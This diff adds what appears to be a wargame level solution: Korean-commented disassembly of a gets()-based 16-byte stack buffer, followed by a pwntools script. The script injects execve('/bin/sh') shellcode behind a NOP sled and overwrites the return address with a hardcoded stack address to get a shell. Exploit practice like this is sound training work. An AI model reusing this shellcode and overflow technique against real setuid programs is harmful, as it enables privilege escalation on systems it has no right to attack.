@@ -1,0 +1,30 @@
+   0x080483f8 <+0>:	push   ebp		
+   0x080483f9 <+1>:	mov    ebp,esp
+   0x080483fb <+3>:	sub    esp,0x10			; buf : 0x10bytes
+   0x080483fe <+6>:	lea    eax,[ebp-0x10]		; eax에 buf주소 복사
+   0x08048401 <+9>:	push   eax			; eax값을 스택에 push
+   0x08048402 <+10>:	call   0x804830c <gets@plt>	; gets(buf);
+   0x08048407 <+15>:	add    esp,0x4
+   0x0804840a <+18>:	lea    eax,[ebp-0x10]
+   0x0804840d <+21>:	push   eax
+   0x0804840e <+22>:	push   0x8048470
+   0x08048413 <+27>:	call   0x804833c <printf@plt>
+   0x08048418 <+32>:	add    esp,0x8
+   0x0804841b <+35>:	leave  
+   0x0804841c <+36>:	ret    
+
+
+
+from pwn import *
+
+context.log_level = 'debug'
+
+argv = '\x90' * 500 + '\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' 
+
+p = process(['./lv3', argv])
+p.sendline('a' * 16 + 'bbbb' + p32(0xffffd3dc))
+p.sendline('id')
+p.recv()
+p.sendline('my-pass')
+p.recv()
+p.interactive()
